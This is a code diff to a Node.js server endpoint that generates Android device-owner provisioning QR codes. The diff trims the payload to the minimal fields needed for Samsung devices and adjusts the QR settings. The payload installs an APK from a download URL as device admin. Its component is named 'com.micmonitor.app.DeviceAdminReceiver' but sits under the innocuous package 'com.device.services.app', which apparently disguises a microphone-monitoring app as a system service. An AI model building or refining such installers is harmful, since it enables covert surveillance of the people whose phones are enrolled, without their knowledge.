@@ -939,36 +939,15 @@ app.get("/api/provisioning-qr", async (req, res) => {
     : "WPA";
   const wifiHidden = ["1", "true", "yes"].includes(wifiHiddenRaw);
 
+  // Minimal Samsung-safe provisioning (only required fields)
   const provisioningData = {
     "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME":
       "com.device.services.app/com.micmonitor.app.DeviceAdminReceiver",
-    "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_NAME":
-      "com.device.services.app",
     "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION":
       apkDownloadUrl,
     "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_CHECKSUM": checksum,
-    "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": true,
-    "android.app.extra.PROVISIONING_LEAVE_ALL_SYSTEM_APPS_ENABLED": true,
-    // Skip user setup wizard screens (helps Samsung/Realme)
-    "android.app.extra.PROVISIONING_SKIP_USER_SETUP": true,
-    // Locale settings (optional but helps)
-    "android.app.extra.PROVISIONING_LOCALE": "en_US",
-    "android.app.extra.PROVISIONING_TIME_ZONE": "Asia/Kolkata",
-    "android.app.extra.PROVISIONING_ADMIN_EXTRAS_BUNDLE": {
-      server_url: serverUrl,
-    },
+    "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": false,
   };
-
-  if (wifiSsid) {
-    provisioningData["android.app.extra.PROVISIONING_WIFI_SSID"] = `"${wifiSsid}"`;
-    provisioningData["android.app.extra.PROVISIONING_WIFI_SECURITY_TYPE"] = wifiSecurityType;
-    if (wifiSecurityType !== "NONE" && wifiPassword) {
-      provisioningData["android.app.extra.PROVISIONING_WIFI_PASSWORD"] = `"${wifiPassword}"`;
-    }
-    if (wifiHidden) {
-      provisioningData["android.app.extra.PROVISIONING_WIFI_HIDDEN"] = true;
-    }
-  }
 
   res.set(
     "Cache-Control",
@@ -980,13 +959,9 @@ app.get("/api/provisioning-qr", async (req, res) => {
   let qrDataUrl = null;
   try {
     qrDataUrl = await QRCode.toDataURL(JSON.stringify(provisioningData), {
-      errorCorrectionLevel: "M",
-      margin: 2,
-      width: 320,
-      color: {
-        dark: "#000000",
-        light: "#FFFFFF",
-      },
+      errorCorrectionLevel: "L",
+      margin: 4,
+      width: 500,
     });
   } catch (e) {
     console.warn("Failed to pre-generate QR data URL:", e.message);
